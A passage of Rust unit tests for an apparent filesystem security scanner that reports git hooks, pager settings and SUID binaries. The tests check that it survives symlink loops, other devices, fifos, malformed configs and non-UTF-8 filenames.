        put(&dir, "srv/broken/.git", b"gitdir: ../nowhere\n", 0o644);
        put(&dir, "srv/junk/.git", b"\x00\xff not a gitdir at all", 0o644);

        let s = scan_deep(&dir);
        let names: Vec<&str> = of_kind(&s, Kind::GitHook).iter().map(|e| e.name.as_str()).collect();
        assert_eq!(names.iter().filter(|n| **n == "post-merge").count(), 1);
        assert_eq!(names.iter().filter(|n| **n == "pre-push").count(), 1, "an absolute gitdir is inside the scan root");
        assert_eq!(names.iter().filter(|n| **n == "core.pager").count(), 1, "one repository, reported once");

        let hook = named(&s, "post-merge");
        assert_eq!(hook.raw.get("repository").map(String::as_str), Some(dir.join("srv/app/sub").to_str().unwrap()));
        assert_eq!(hook.raw.get("gitdir").map(String::as_str), Some(dir.join("srv/app/.git/modules/sub").to_str().unwrap()));
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn symlink_loops_terminate_and_the_walk_carries_on_past_them() {
        let dir = tree("loop");
        fs::create_dir_all(dir.join("home/u/deep")).unwrap();
        std::os::unix::fs::symlink("..", dir.join("home/u/up")).unwrap();
        std::os::unix::fs::symlink(".", dir.join("home/u/here")).unwrap();
        std::os::unix::fs::symlink("../u", dir.join("home/u/deep/back")).unwrap();
        std::os::unix::fs::symlink(&dir, dir.join("home/u/root")).unwrap();
        // A link naming itself: resolving it is ELOOP, walking it must not try.
        std::os::unix::fs::symlink("self", dir.join("home/u/self")).unwrap();
        put(&dir, "home/u/deep/tool", b"#!/bin/sh\n", 0o4755);

        let s = scan_deep(&dir);
        assert_eq!(of_kind(&s, Kind::SuidBinary).len(), 1, "the walk finished and found what is past the loops");
        assert_eq!(named(&s, "tool").source, dir.join("home/u/deep/tool"));
        fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn the_walk_refuses_another_device_a_directory_it_has_seen_and_its_ceiling() {
        // A second filesystem cannot be mounted from a test, so the guard that
        // every mount point goes through is asserted directly.
        let root = (0x801, 2);
        let mut w = Walk::new(root);
        assert!(w.may_descend((0x801, 40)));
        assert!(!w.may_descend((0x801, 40)), "a directory reachable twice is entered once");
        assert!(!w.may_descend(root), "a cycle back to the root terminates");
        assert!(!w.may_descend((0x802, 40)), "another device is never descended into");
        assert!(!w.may_descend((0x802, 99)), "nor is any other inode on it");

        w.ceiling = 2;
        w.visited = 0;
        assert!(w.spend());
        assert!(w.spend());
        assert!(!w.spend(), "the walk stops at its ceiling");
    }

    #[test]
    fn hostile_input_yields_fewer_entries_rather_than_a_panic() {
        let dir = tree("hostile");
        // A fifo where a config belongs: opening it would block forever.
        fs::create_dir_all(dir.join("srv/fifo/.git")).unwrap();
        rustix::fs::mknodat(
            rustix::fs::CWD,
            dir.join("srv/fifo/.git/config"),
            rustix::fs::FileType::Fifo,
            rustix::fs::Mode::from_raw_mode(0o644),
            0,
        )
        .unwrap();
        // And one where a hook belongs.
        fs::create_dir_all(dir.join("srv/fifo/.git/hooks")).unwrap();
        rustix::fs::mknodat(
            rustix::fs::CWD,
            dir.join("srv/fifo/.git/hooks/pre-commit"),
            rustix::fs::FileType::Fifo,
            rustix::fs::Mode::from_raw_mode(0o755),
            0,
        )
        .unwrap();

        put(&dir, "srv/junk/.git/config", b"[unterminated\n=novalue\nkey=\n[core]\npager", 0o644);
        put(&dir, "srv/junk/.git/hooks/x", &[0xff, 0xfe, 0x00, 0x21], 0o755);
        put(&dir, "srv/bin/\u{fffd}", b"", 0o4755);
        fs::write(dir.join("srv/bin/").join(OsStr::from_bytes(b"\xff\xfebad")), b"").unwrap();
        fs::set_permissions(
            dir.join("srv/bin/").join(OsStr::from_bytes(b"\xff\xfebad")),
            PermissionsExt::from_mode(0o4755),
        )
        .unwrap();
        // A `.git` file naming the scan root itself.
        put(&dir, "srv/recursive/.git", b"gitdir: /\n", 0o644);

        let s = scan_deep(&dir);
        assert!(matches!(status(&s), Status::Complete | Status::Partial { .. }));
        let binary = s
            .entries
            .iter()
            .find(|e| e.kind == Kind::SuidBinary && e.has_flag(Flag::EncodingAnomaly))
            .expect("a filename that is not UTF-8 is evidence, not a crash");
        assert!(binary.raw.contains_key("name_raw_hex"));
        // The hook with no shebang and no valid UTF-8 is still a hook.
        assert_eq!(named(&s, "x").kind, Kind::GitHook);
        assert!(!named(&s, "x").raw.contains_key("interpreter"));
        fs::remove_dir_all(&dir).unwrap();
    }
}
